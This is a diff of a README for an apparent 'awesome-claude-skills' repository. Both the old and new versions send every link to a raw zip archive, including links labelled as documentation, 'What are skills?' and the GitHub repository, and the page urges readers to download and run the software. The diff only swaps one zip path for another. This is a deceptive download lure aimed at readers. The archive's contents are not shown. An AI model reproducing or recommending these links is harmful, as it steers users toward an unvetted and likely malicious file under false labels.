@@ -1,6 +1,6 @@
 # 🌟 awesome-claude-skills - Enhance Claude’s Capabilities with Skills
 
-[![Download from Releases](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip%20from%https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
+[![Download from Releases](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip%20from%https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -12,10 +12,10 @@ Skills are collections of instructions and scripts designed to improve Claude's 
 
 Explore more about skills with these links:
 
-- [What are skills?](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
-- [Using skills in Claude](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
-- [How to create custom skills](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
-- [Equipping agents for the real world with Agent Skills](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
+- [What are skills?](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)
+- [Using skills in Claude](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)
+- [How to create custom skills](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)
+- [Equipping agents for the real world with Agent Skills](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ To run the awesome-claude-skills application smoothly, ensure your system meets 
 
 To get started, visit the Releases page to download the latest version of the software. Click the link below:
 
-[Download from Releases](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
+[Download from Releases](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -79,7 +79,7 @@ You can open an issue on the GitHub page or contact us through the links provide
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
-- [Documentation](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/mcp-builder/scripts/skills_claude_awesome_1.7.zip)
 
 Thank you for using awesome-claude-skills! We appreciate your interest in enhancing Claude’s skills. Enjoy your experience!
